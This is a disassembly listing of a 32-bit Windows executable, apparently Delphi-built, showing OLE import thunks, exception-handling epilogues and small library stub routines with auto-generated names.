jmp [ __import_lookup_table_11(oleaut32:SafeArrayCreate) ]
SafeArrayGetLBound
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetLBound) ]
SafeArrayGetUBound
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetUBound) ]
sub_40dd91
jmp sub_4039ec
sub_40dd98
pop ebp
retn
sub_40dd9c
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40da60
sub_40ddad
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_40e436
jmp sub_4039ec
sub_40e43d
pop ecx
pop ebp
retn
sub_40e4cf
jmp sub_4039ec
sub_40e4d6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e526
jmp sub_4039ec
sub_40e52d
pop ecx
pop ebp
retn
sub_40e57a
jmp sub_4039ec
sub_40e581
pop ecx
pop ebp
retn
sub_40e613
jmp sub_4039ec
sub_40e61a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e66a
jmp sub_4039ec
sub_40e671
pop ecx
pop ebp
retn
sub_40e8b9
jmp sub_4039ec
sub_40e8c0
pop ebx
mov esp ebp
pop ebp
retn
sub_40e9d6
jmp sub_4039ec
sub_40e9dd
pop ecx
pop ebp
retn
sub_40e9e0
push ebx
mov ebx eax
mov eax ebx
call sub_40ec78
mov [ ebx ] 0x1
pop ebx
retn
sub_40ec8c
push eax
call sub_40ec78
pop eax
retn
sub_40eeec
call sub_40efa0
retn
sub_40f040
jmp sub_4039ec
sub_40f047
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f08e
jmp sub_4039ec
sub_40f095
pop ebx
pop ecx
pop ebp
retn
sub_40f0da
jmp sub_4039ec
sub_40f0e1
pop ebx
pop ecx
pop ebp
retn
sub_40f126
jmp sub_4039ec
sub_40f12d
pop ebx
pop ecx
pop ebp
retn
sub_40f172
jmp sub_4039ec
sub_40f179
pop ebx
pop ecx
pop ebp
retn
sub_40f53b
jmp sub_4039ec
sub_40f542
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40f5dc
jmp sub_4039ec
sub_40f5e3
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40fa51
jmp sub_403738
sub_40fb0c
jmp sub_403738
sub_40fbb3
jmp sub_403738
sub_40fcac
jmp sub_403738
sub_40fd85
jmp sub_403738
sub_40fe6d
jmp sub_403738
sub_41002a
jmp sub_4039ec
sub_410031
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410093
jmp sub_4039ec
sub_41009a
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410500
jmp sub_403738
sub_4105ef
jmp sub_4039ec
sub_4105f6
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410694
jmp sub_4039ec
sub_41069b
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410a38
call sub_4106f0
neg al
sbb eax eax
neg eax
retn
sub_410af9
jmp sub_4039ec
sub_410b00
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410ba9
jmp sub_4039ec
sub_410bb0
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411101
jmp sub_403738
sub_411208
jmp sub_4039ec
sub_41120f
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411319
jmp sub_4039ec
sub_411320
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411770
jmp sub_4039ec
sub_411777
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411881
jmp sub_4039ec
sub_411888
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411dce
jmp sub_4039ec
sub_411dd5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_411e79
jmp sub_4039ec
sub_411e80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411ea2
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4046e0
retn
sub_411e9b
jmp sub_4039ec
sub_411ea2
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_411efe
jmp sub_4039ec
sub_411f05
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_411f81
jmp sub_4039ec
sub_4124c7
jmp sub_4039ec
sub_4124ce
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412561
jmp sub_4039ec
sub_412568
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412585
lea eax [ ebp - 0x14 ]
call sub_4046c8
retn
sub_41257e
jmp sub_4039ec
sub_412585
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4125e2
jmp sub_4039ec
sub_4125e9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41268b
jmp sub_4039ec
sub_4126a8
jmp sub_4039ec
sub_4126af
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_412c0a
jmp sub_4039ec
sub_412c11
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412c82
jmp sub_4039ec
sub_412c89
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413014
push eax
call sub_40ec78
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_413028
push eax
call sub_40ec78
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_4131b3
jmp sub_4039ec
sub_4131df
jmp sub_4039ec
sub_4131e6
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413413
jmp sub_4039ec
sub_41341a
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4136bb
jmp sub_4039ec
sub_413749
jmp sub_4039ec
sub_413839
jmp sub_4039ec
sub_4138db
jmp sub_4039ec
sub_413991
jmp sub_4039ec
sub_413a38
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_40efa0
add esp 0x10
sub_413ce2
jmp sub_4039ec
sub_413ce9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413d2c
mov ax [ eax ]
retn
sub_413e2c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40ec78
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_413e44
mov edx 0x80020004
call sub_413e2c
retn
sub_413e94
mov dl 0x1
call sub_413e9c
retn
sub_413f49
jmp sub_4039ec
sub_413f50
pop esi
pop ebx
pop ebp
retn
sub_413f54
push ebp
mov ebp esp
call sub_414114
pop ebp
retn 0x4
sub_413fe0
push ebp
mov ebp esp
call sub_414114
pop ebp
retn 0x4
sub_4140c3
jmp sub_4039ec
sub_4140ca
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403260
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_40360c
sub_4140ec
xor eax eax
retn
sub_4140f0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_414104
mov [ ecx ] 0x8
mov al 0x1
retn
sub_41410c
call sub_40e3ec
retn
sub_414114
call sub_40e4dc
retn
sub_41411c
call sub_40e98c
retn
sub_414124
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_414138
call sub_414114
retn
sub_414140
push ebp
mov ebp esp
call sub_41411c
pop ebp
retn 0x8
sub_414158
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_414234
jmp sub_4039ec
sub_4142fd
jmp sub_4039ec
sub_414304
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414321
lea eax [ ebp - 0x10 ]
call sub_403fe8
retn
sub_41431a
jmp sub_4039ec
sub_414321
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41432c
call sub_40e9e0
retn
sub_414334
mov ecx 0xe
call sub_4139d0
cmp al 0x1
retn
sub_4143b3
jmp sub_4039ec
sub_4143ba
pop ebp
retn
sub_41445d
jmp sub_4039ec
sub_414464
pop ebp
retn
sub_41457d
jmp sub_4039ec
sub_414584
pop ebp
retn
sub_414588
sub [ rw-data ] 0x1
retn
sub_414686
jmp sub_4039ec
sub_41468d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4149ac
push ebx
add esp 0xffffff00
mov ebx ecx
push 0xff
lea ecx [ esp + 0x4 ]
call sub_414914
mov eax ebx
mov edx esp
call sub_40424c
add esp 0x100
pop ebx
retn
sub_414a08
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40403c
pop esi
pop ebx
retn
sub_414ae4
jmp sub_4039ec
sub_414aeb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414b3c
jmp sub_4039ec
sub_414b43
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414c90
jmp sub_4039ec
sub_414c97
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414d66
jmp sub_4039ec
sub_414d6d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415084
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40efa0
pop esi
pop ebx
retn
sub_41532e
jmp sub_4039ec
sub_415335
pop ebp
retn
sub_415338
sub [ rw-data ] 0x1
retn
IsEqualGUID
jmp [ IsEqualGUID@IAT ]
CoInitialize
jmp [ CoInitialize@IAT ]
CoUninitialize
jmp [ CoUninitialize@IAT ]
CoTaskMemAlloc
jmp [ __import_lookup_table_12(ole32:CoTaskMemAlloc) ]
CoTaskMemFree
jmp [ __import_lookup_table_12(ole32:CoTaskMemFree) ]
StgCreateDocfileOnILockBytes
jmp [ StgCreateDocfileOnILockBytes@IAT ]
StgOpenStorageOnILockBytes
jmp [ __import_lookup_table_12(ole32:StgOpenStorageOnILockBytes) ]
OleInitialize
jmp [ OleInitialize@IAT ]
OleUninitialize
jmp [ OleUninitialize@IAT ]
OleLoad
jmp [ __import_lookup_table_12(ole32:OleLoad) ]
OleSave
jmp [ __import_lookup_table_12(ole32:OleSave) ]
OleSetContainedObject
jmp [ __import_lookup_table_12(ole32:OleSetContainedObject) ]
OleSetMenuDescriptor
jmp [ __import_lookup_table_12(ole32:OleSetMenuDescriptor) ]
OleDraw
jmp [ __import_lookup_table_12(ole32:OleDraw) ]
OleGetIconOfClass
jmp [ OleGetIconOfClass@IAT ]
CreateILockBytesOnHGlobal
jmp [ __import_lookup_table_12(ole32:CreateILockBytesOnHGlobal) ]
SysFreeString
jmp [ __import_lookup_table_13(oleaut32:SysFreeString) ]
GetErrorInfo
jmp [ __import_lookup_table_13(oleaut32:GetErrorInfo) ]
sub_415685
jmp sub_4039ec
sub_41568c
pop ebp
retn
sub_415690
sub [ rw-data ] 0x1
retn
sub_415f93
add [ esp + 0x4 ] 0xfffffff8
jmp sub_418d40
sub_415f9d
add [ esp + 0x4 ] 0xfffffff8
jmp sub_418d60
sub_4160fd
jmp [ eax + edx * 4 ]
sub_416899
push 0x180041
add [ eax ] al
int3
sub_416b83
add [ esp + 0x4 ] 0xffffffd8
jmp sub_42103c
sub_416b8d
add [ esp + 0x4 ] 0xffffffd8
jmp sub_42105c
sub_416b97
add [ esp + 0x4 ] 0xffffffd4
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
sub_416f04
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_417028
mov eax [ eax + 0xc ]
call sub_4183f4
retn
sub_4172ff
jmp sub_4039ec
sub_417306
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41730c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_4185ac
test eax eax
setge al
pop esi
pop ebx
retn
sub_41760f
jmp sub_4039ec
sub_417616
mov esp ebp
pop ebp
retn
sub_4176e4
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_4176f0
push ebx
mov ebx edx
mov edx ebx
call sub_417504
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_417264
sub_41779c
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_4178f7
jmp sub_4039ec
sub_4179cb
jmp sub_4039ec
sub_4179dc
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_417a48
jmp sub_4039ec
sub_417a4f
pop ebx
mov esp ebp
pop ebp
retn
sub_417a9a
jmp sub_4039ec
sub_417aa1
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_417b2d
jmp sub_4039ec
sub_417b34
pop ebx
pop ebp
retn
sub_417b7a
jmp sub_4039ec
sub_417b81
pop ebx
pop ebp
retn
sub_417bc6
jmp sub_4039ec
sub_417bcd
pop ebx
pop ebp
retn
sub_417c17
jmp sub_4039ec
sub_417c1e
pop esi
pop ebx
pop ebp
retn
sub_417c72
jmp sub_4039ec
sub_417c79
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_417da6
jmp sub_4039ec
sub_417e22
jmp sub_4039ec
sub_417ef8
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_4186ec
sub_417fe8
jmp sub_4039ec
sub_418172
jmp sub_4039ec
sub_418179
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418213
jmp sub_4039ec
sub_41821a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418239
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_418232
jmp sub_4039ec
sub_418239
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_4182a5
jmp sub_4039ec
sub_4182ac
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4183a4
jmp sub_4039ec
sub_4183ab
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403270
retn
sub_4183c1
jmp sub_4039ec
sub_418428
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_418748
xor edx edx
mov eax ebx
call sub_41870c
pop ebx
retn
sub_4184a0
mov eax [ ebp + 0x4 ]
retn
sub_4184d6
pop ecx
pop edx
pop esi
pop ebx
retn
sub_418524
jmp sub_4039ec
sub_41852b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_418530
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_418548
xor edx edx
call sub_418550
retn
sub_418638
mov edx [ eax + 0x8 ]
dec edx
call sub_418550
retn
sub_4187b8
retn
sub_418872
jmp sub_4039ec
sub_418879
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_40360c
sub_418908
jmp sub_4039ec
sub_41890f
pop ebx
pop ecx
pop ebp
retn
sub_418914
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_41896b
jmp sub_4039ec
sub_418972
pop ebx
pop ecx
pop ebp
retn
sub_418978
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_4189b4
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
retn
sub_4189cc
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_418aa7
retn
sub_418b4c
test edx edx
je r-xdata
xor edx edx
call sub_418b60
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_418c16
jmp sub_4039ec
sub_418c1d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418c30
xchg edx eax
call sub_418b60
retn
sub_418c38
retn
sub_418cd1
jmp sub_4039ec
sub_418cd8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418d2e
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
sub_418e95
jmp sub_4039ec
sub_418e9c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_419005
jmp sub_4039ec
sub_41900c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419050
xor edx edx
call sub_418f0c
retn
sub_4191be
jmp sub_4039ec
sub_4191d8
inc [ eax + 0xc ]
retn
sub_4191dc
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_419246
jmp sub_4039ec
sub_419254
dec [ eax + 0xc ]
call sub_4191dc
retn
sub_419290
xor eax eax
retn
sub_419294
push ebx
mov ebx ecx
mov eax ebx
call sub_403fe8
pop ebx
retn
sub_4192c8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_418550
pop esi
pop ebx
retn
sub_41938a
jmp sub_4039ec
sub_419391
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4194a1
jmp sub_4039ec
sub_41957c
retn
sub_419580
retn
sub_419584
retn
sub_419588
retn
sub_4196b2
jmp sub_4039ec
sub_4196b9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4196d6
lea eax [ ebp - 0xc ]
call sub_403fe8
retn
sub_4196cf
jmp sub_4039ec
sub_4196d6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419760
jmp sub_4039ec
sub_419778
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_419834
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_4198dd
jmp sub_4039ec
sub_4198e4
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4198f0
mov eax [ ebp + 0x4 ]
retn
sub_419926
pop ecx
pop edx
pop esi
pop ebx
retn
sub_419974
jmp sub_4039ec
sub_41997b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_419a3a
jmp sub_4039ec
sub_419a41
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419a63
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40400c
retn
sub_419a5c
jmp sub_4039ec
sub_419a63
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419a6c
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_419a74
xor eax eax
retn
sub_419abd
jmp sub_4039ec
sub_419ac4
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_419bd7
jmp sub_4039ec
sub_419bde
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419c6c
jmp sub_4039ec
sub_419c73
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419d43
jmp sub_4039ec
sub_419d4a
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419e00
jmp sub_4039ec
sub_419e07
pop esi
pop ecx
pop ebp
retn
sub_419e8c
jmp sub_4039ec
sub_419e93
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419eb0
lea eax [ ebp - 0x8 ]
call sub_403fe8
retn
sub_419ea9
jmp sub_4039ec
sub_419eb0
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_419f3c
jmp sub_4039ec
sub_419f59
jmp sub_4039ec
sub_419f60
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_419f9c
retn
sub_41a01f
jmp sub_4039ec
sub_41a026
mov eax [ ebp - 0x8 ]
call sub_41cbb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a04b
lea eax [ ebp - 0xc ]
call sub_403fe8
retn
sub_41a044
jmp sub_4039ec
sub_41a04b
mov esp ebp
pop ebp
retn
sub_41a09b
jmp sub_4039ec
sub_41a0a2
pop esi
pop ecx
pop ebp
retn
sub_41a0f5
jmp sub_4039ec
sub_41a0fc
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41a104
retn
sub_41a17f
jmp sub_4039ec
sub_41a186
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41a223
jmp sub_4039ec
sub_41a22a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a247
lea eax [ ebp - 0x8 ]
call sub_403fe8
retn
sub_41a240
jmp sub_4039ec
sub_41a247
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41a24c
retn
sub_41a2c6
jmp sub_4039ec
sub_41a2cd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a2d4
mov eax edx
mov edx ecx
call sub_407f3c
retn
sub_41a2e0
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
mov al [ ebx + 0x7 ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_41a2f8
sub_41a370
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop ebx
retn
sub_41a3e0
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_41a3fc
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_41a5f0
mov eax [ eax + 0x18 ]
retn
sub_41a5f4
mov eax [ eax + 0x14 ]
retn
sub_41a690
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_41a89c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
shl edx 0x3
lea eax [ ebx + 0x10 ]
call sub_402734
mov [ ebx + 0x18 ] esi
pop esi
pop ebx
retn
sub_41a8d8
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_41a8f0
push ebx
mov ebx [ eax + 0x10 ]
mov ecx [ ebx + ecx * 8 ]
mov ebx [ eax + 0x10 ]
mov edx [ ebx + edx * 8 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_41a904
mov edx sub_41a8f0
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_41a94c
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_407f3c
retn
mov eax edx
mov edx ecx
call sub_407f04
retn
sub_41a9e8
retn
sub_41ace0
jmp sub_4039ec
sub_41ace7
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41ad48
jmp sub_4039ec
sub_41ad4f
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41ad94
mov eax [ eax + 0x4 ]
call sub_4084b4
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41ada4
mov eax [ eax + 0x4 ]
call sub_4084e0
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41ade0
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_41af89
jmp sub_4039ec
sub_41afe8
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_41b078
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_41b0c8
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_41b303
jmp sub_4039ec
sub_41b30a
mov esp ebp
pop ebp
retn
sub_41b3b4
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
retn
sub_41b43c
mov [ eax + 0x18 ] edx
retn
sub_41b5b8
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_4148b8
retn
sub_41b63f
jmp sub_4039ec
sub_41b646
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41b6f2
jmp sub_4039ec
sub_41b6f9
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41b89d
jmp sub_4039ec
sub_41b8ef
jmp sub_4039ec
sub_41b90e
jmp sub_4039ec
sub_41b915
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b934
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41b92d
jmp sub_4039ec
sub_41b934
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b9d7
jmp sub_4039ec
sub_41ba5f
jmp sub_4039ec
sub_41ba6c
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
pop ebx
retn
sub_41ba84
mov eax [ rw-data ]
call sub_41ba6c
retn
sub_41babc
push ebx
call sub_4146ec
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_41ba84
sub_41bc29
jmp sub_4039ec
sub_41bc30
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_403fe8
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_41bd50
jmp sub_4039ec
sub_41bd57
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41be4e
jmp sub_4039ec
sub_41be6b
jmp sub_4039ec
sub_41be72
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41bf70
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41a968
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_41c034
push ebx
mov ebx eax
mov eax ebx
call sub_41d9e8
cmp al 0x9
sete al
pop ebx
retn
sub_41c093
jmp sub_4039ec
sub_41c09a
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41c140
jmp sub_4039ec
sub_41c147
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41c3c6
jmp sub_403738
sub_41c3f2
jmp sub_403738
sub_41c494
jmp sub_403738
sub_41c537
jmp sub_403738
sub_41c70f
jmp sub_403738
sub_41c751
jmp sub_4039ec
sub_41c781
jmp sub_4039ec
sub_41c788
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c7f7
jmp sub_4039ec
sub_41c8ce
jmp sub_4039ec
sub_41c8d5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41cba8
mov dl 0x1
call sub_41bb10
retn
sub_41cce9
jmp sub_4039ec
sub_41ccf0
pop ebx
mov esp ebp
pop ebp
retn
sub_41ccf8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41daf8
mov eax [ rw-data ]
call sub_41ba6c
pop ebp
retn
j_sub_403864
jmp sub_403864
j_sub_403864#2
jmp sub_403864
sub_41ce9e
add [ eax ] eax
add [ eax ] al
jno r-xdata
add ebp [ ebx - 0x2 ]
add [ edx - 0x76ffbe32 ] ch
retn
sub_41cee4
jmp sub_4039ec
sub_41ceeb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41cfcb
jmp sub_4039ec
sub_41cfd2
mov esp ebp
pop ebp
retn
sub_41d08a
jmp sub_4039ec
sub_41d091
pop ecx
pop ecx
pop ebp
retn
sub_41d393
jmp sub_4039ec
sub_41d39a
pop ebx
mov esp ebp
pop ebp
retn
sub_41d63f
jmp sub_4039ec
sub_41d646
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_403270
retn
sub_41d65f
jmp sub_4039ec
sub_41d683
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_403738
sub_41d6ba
jmp sub_403738
sub_41d6f9
jmp sub_4039ec
sub_41d700
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d722
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_40400c
retn
sub_41d71b
